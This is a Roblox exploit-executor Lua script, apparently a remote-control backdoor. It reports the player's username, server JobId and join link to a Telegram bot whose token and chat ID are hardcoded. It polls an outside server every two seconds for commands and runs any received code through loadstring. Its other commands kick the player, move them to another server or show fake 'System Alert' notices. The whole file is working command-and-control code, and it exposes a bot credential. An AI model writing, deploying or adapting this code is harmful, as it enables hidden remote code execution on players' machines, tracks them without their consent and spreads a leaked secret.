--======================--
--  CONFIG
--======================--

local BOT_TOKEN = "8506651300:AAEuhXSs86i1x_yCznkfefjz8vIz9gGTqmg"
local SERVER = "https://remote-roblox.vercel.app"
local chatId = "7777604508"

--======================--
--  HTTP WRAPPER
--======================--

local Http = {}

function Http:GetAsync(url)
    return game:HttpGet(url)
end

function Http:JSONDecode(str)
    return game:GetService("HttpService"):JSONDecode(str)
end

function Http:UrlEncode(str)
    return game:GetService("HttpService"):UrlEncode(str)
end

local HttpService = Http
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local username = Players.LocalPlayer.Name

local function sendStart()
    local HS = game:GetService("HttpService")
    local req = (syn and syn.request) or http_request or request

    local msg = "🟢 " .. username .. " is now online."

    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage"

    req({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HS:JSONEncode({
            chat_id = chatId,
            text = msg
        })
    })

    
end

local endpoint = SERVER .. "/getcmd/" .. HttpService:UrlEncode(username)

print("[CMD LISTENER] Started for:", username)
sendStart()
--======================--
-- FLAG
--======================--

local flag = Instance.new("BoolValue")
flag.Name = "ScriptConnected"
flag.Parent = Players.LocalPlayer

--======================--
-- UTILS
--======================--

local function debug(msg)
	print("[CMD DEBUG] " .. msg)
end

local function alert(msg)
	game:GetService("StarterGui"):SetCore("SendNotification", {
		Title = "System Alert",
		Text = msg,
		Duration = 4
	})
end

local function kick(reason)
	Players.LocalPlayer:Kick(reason)
end

local function hop()
	TeleportService:Teleport(game.PlaceId)
end

local function TPToPlayer(name)
    local target = game.Players:FindFirstChild(name)
    if not target then return warn("Player not found!") end

    local targetChar = target.Character
    if not targetChar then return warn("Target has no character!") end

    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    if not targetHRP then return warn("Target HRP missing!") end

    local LP = game.Players.LocalPlayer
    local char = LP.Character or LP.CharacterAdded:Wait()
    local HRP = char:WaitForChild("HumanoidRootPart") -- INI YG KURANG DALAM CODEMU

    HRP.CFrame = targetHRP.CFrame + Vector3.new(0, 3, 0)
end
--============================================--
--  SEND INFO → DIRECT TELEGRAM API
--============================================--

local function sendInfo()
    local HS = game:GetService("HttpService")
    local req = (syn and syn.request) or http_request or request

    local marketplace = game:GetService("MarketplaceService")
    local info = marketplace:GetProductInfo(game.PlaceId)

    local placeName = info.Name or "Unknown"
    local placeId = game.PlaceId
    local jobId = game.JobId

    -- URL yang dijadikan button
    local joinUrl = "https://www.roblox.com/games/"..placeId.."/?privateServerLinkCode="..jobId
    local playerCount = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
    local exec = (identifyexecutor and identifyexecutor()) or "N/A"

    -- pesan TANPA link
    local message =
        "ℹ️ INFO PLAYER: " .. username .. "\n\n" ..
        "🗺 Map: " .. placeName .. "\n" ..
        "🏷 PlaceId: " .. placeId .. "\n" ..
        "🌀 JobId: " .. jobId .. "\n\n" ..
        "👥 Players: " .. playerCount .. "/" .. maxPlayers .. "\n" ..
        "📡 Ping: " .. ping .. "ms\n" ..
        "⚙ Executor: " .. exec

    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage"

    req({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HS:JSONEncode({
            chat_id = chatId,
            text = message,
            reply_markup = {
                inline_keyboard = {
                    {
                        { text = "JOIN SERVER", url = joinUrl }
                    }
                }
            }
        })
    })

    print("Telegram INFO SENT!")
end

local function run(code)
    local suc, result = pcall(function()
        return loadstring(code)()
    end)

    if suc then
        print("[REMOTE EXEC] Success:")
    else
        print("[REMOTE EXEC ERROR]", result)
    end
end
--============================================--
-- MAIN LOOP
--============================================--

while true do
	task.wait(2)

	local success, response = pcall(function()
		return HttpService:GetAsync(endpoint)
	end)

	if not success then
		debug("HTTP ERROR: " .. tostring(response))
		continue
	end

	if response == "" then continue end

	local cmdData
	local ok = pcall(function()
		cmdData = HttpService:JSONDecode(response)
	end)

	if not ok or not cmdData then
		debug("JSON ERROR")
		continue
	end

	local action = cmdData.action
	if action == "none" then continue end

	debug("Command received: " .. action)

	if action == "kick" then
		kick(cmdData.reason or "No reason")

	elseif action == "alert" then
		alert(cmdData.message or "No message")

	elseif action == "srvhop" then
		hop()
		
	elseif action == "run" then
    run(cmdData.code)

	elseif action == "info" then
		sendInfo()
	end
end
